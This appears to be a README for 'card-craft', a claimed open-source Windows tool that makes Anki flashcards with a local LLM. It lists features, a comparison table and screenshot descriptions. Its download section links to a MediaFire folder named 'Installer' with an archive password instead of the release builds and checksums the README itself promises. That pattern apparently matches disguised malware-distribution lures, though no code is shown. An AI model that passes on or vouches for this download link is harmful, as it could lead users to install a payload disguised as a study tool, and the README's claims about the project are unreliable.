# card-craft

🃏 Free, open-source flashcard maker for Windows — turn notes and PDFs into Anki-ready cards with a local LLM. 100 MB portable, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Notes to cards** — paste lecture text or a chapter PDF and get question-answer pairs back from a local model
- ✅ **Cloze deletions** — sentences with hidden keywords turned into proper cloze cards
- ✅ **Approve flow** — every draft card reviewed, edited or rejected fast in a keyboard-only pass
- ✅ **Anki export** — deck-importable CSV and APKG-style packaging with tags and source fields intact
- ✅ **Source anchoring** — each card keeps the page and paragraph it came from for verification
- ✅ **Batch chapters** — a whole textbook folder processed into tagged decks per chapter
- ✅ **100 MB self-contained exe** — runtime bundled, model runs locally via llama.cpp, offline, MIT

## Why card-craft

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB build - no setup required, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **card-craft** | Anki add-ons | ChatGPT web | Quizlet |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free, mixed | Free tier | Paid tiers |
| Open source | **Yes** | Yes | No | No
| Source material stays local | **Yes** | Yes | Upload | Upload
| Cloze plus Q&A in one pass | **Yes** | Partial | Manual | Manual
| Chapter batch to tagged decks | **Yes** | No | No | No
| Portable, no install | **Yes, 100 MB** | Inside Anki | Browser | Browser

## FAQ

**how to make Anki flashcards automatically from my notes offline?**

Generating cards in a chatbot means pasting chapters into a cloud service and fixing formatting by hand. card-craft drafts Q&A and cloze cards locally with source anchors and exports decks ready for review. It is a 100 MB portable exe, MIT, and your study material stays on disk.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark study desk (#121417, teal #0D9488): source PDF left with paragraph selected, three draft cards right with edit fields, approve and reject controls highlighted.
2. Keyboard review pass: card focused in the center, shortcuts strip reading a approve r reject e edit, counter chip showing 34 of 120 cards done.
3. Export step: deck name field reading cardiology-ch4, tag mapping table, APKG checkbox on, CSV preview with columns front and back.

## Download

| Source | Link |
|---|---|
| 💾 **Installer card-craft** | [Installer card-craft](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET 8 SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).